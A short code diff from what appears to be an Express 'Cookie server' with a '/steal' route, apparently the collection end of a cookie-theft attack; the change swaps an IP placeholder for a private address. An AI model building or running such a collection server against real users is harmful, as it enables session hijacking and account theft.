@@ -20,6 +20,6 @@ app.get('/steal', (req, res) => {
 
 // Start the server and listen on all interfaces
 app.listen(port, '0.0.0.0', () => {
-    console.log(`Cookie server is running on http://<YOUR-IP-ADDRESS>:${port}`);
+    console.log(`Cookie server is running on http://10.0.1.12:${port}`);
     console.log('Replace <YOUR-IP-ADDRESS> with your actual IP address.');
 });
